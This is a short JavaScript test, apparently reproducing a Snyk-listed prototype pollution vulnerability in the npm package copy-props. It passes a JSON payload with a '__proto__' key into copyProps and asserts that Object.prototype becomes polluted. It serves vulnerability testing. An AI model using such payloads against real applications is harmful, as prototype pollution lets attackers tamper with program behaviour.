//https://snyk.io/vuln/SNYK-JS-COPYPROPS-1082870
test("prototype pollution in copy-props", () => {
  expect({}.polluted).toBe(undefined);

  const copyProps = require("copy-props");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  copyProps(JSON.parse(malicious_payload), {});

  expect({}.polluted).toBe("yes");
});
